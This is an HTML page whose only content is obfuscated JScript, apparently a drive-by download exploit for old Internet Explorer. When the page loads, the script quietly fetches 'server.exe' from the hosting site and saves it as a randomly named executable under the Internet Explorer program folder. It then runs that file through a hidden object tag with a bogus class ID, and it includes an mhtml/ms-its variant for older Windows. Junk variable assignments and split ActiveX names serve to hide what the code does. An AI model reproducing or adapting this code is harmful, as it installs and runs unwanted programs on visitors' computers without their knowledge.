<html>
<body>
<DIV id="ObjectContainer"></DIV>
<IFRAME name="icounter" width=60 height=30 style="display:none"></IFRAME>
<SCRIPT LANGUAGE="JScript">   
   
   
   function LaunchExecutable9X(InetPath)
   {
     tagstyle='style="display:none"'; 
t=13;
     ObjCLSID="clsid:10000000-1000-0000-10000-000000000001";
t=t+25;
     ObjBASE='mhtml:file://C:\\ARCHIVE.MHT!'+InetPath;
     sObject ='<object classid="'+ObjCLSID+'" codebase="'+ObjBASE+'" '+tagstyle+'></object>';
t=t-7;
     icounter.document.write(sObject);
     setTimeout('icounter.document.execCommand("Refresh")',1000);
 
   }
   
  function LaunchExecutable2K(ObjSrc)
   {
k=36;
     tagstyle='style="display:none"'; 
     ObjCLSID="clsid:10000000-1000-0000-10000-000000000001";
k=k-3;
     sObject ='<object classid="'+ObjCLSID+'" codebase="'+ObjSrc+'" '+tagstyle+'></object>';
     try
     {
         ObjectContainer.innerHTML=sObject;
     }
     catch(e){}  
   }

r=34;
   ObjSrc="";
   
   for (ik=0;ik<8;ik++)
   {
       ii=Math.random();
r=9;
       chCode=Math.round(ii*25)+0x61;
       chSym=String.fromCharCode(chCode);
r=35;
       ObjSrc=ObjSrc+chSym;
       if (chCode==0x61) {break};
   }

t=15;
   ObjSrc="C:\\Program Files\\Internet Explorer\\"+ObjSrc+".exe";
r=9; 
   var InetPath=document.location.href;
t=t+r;
   iPrefix=InetPath.substring(0,7);
  
   switch(iPrefix)
   {
   case "http://" :
                   j=InetPath.lastIndexOf('/');
t=57;
                   InetPath=InetPath.slice(0,j)+'/server.exe';
t=t+4747;
                   break; 
   case "ms-its:" :
                   i=InetPath.indexOf('!');
r=9540;
                   j=InetPath.lastIndexOf('//'); 
r=r+8445;
                   InetPath=InetPath.slice(i+1,j)+'/server.exe';
r=r-45;
                   break;
   }
 
  
   
   {
k=7;
rtq="cros";
tye="LHTT";
   var oXMLHTTP = new ActiveXObject("Mi"+rtq+"oft.XM"+tye+"P"); 
k=k+3;
   oXMLHTTP.Open("GET",InetPath,0); 
k=4;
   oXMLHTTP.Send();   

   try
   {
      var oStream = new ActiveXObject('ADODB.Stream'); 
y=45;
      oStream.Mode = 3; 
y=1+y;
      oStream.Type = 1; 
      oStream.Open(); 
y=y-7;
      oStream.Write(oXMLHTTP.responseBody); 
y=8;
      oStream.SaveToFile(ObjSrc,2);
   }
   catch(e){}

   setTimeout("LaunchExecutable2K(ObjSrc)",1000);
   }

 
   {
      LaunchExecutable9X(InetPath);
   }

</script> 
</body>
</html><br>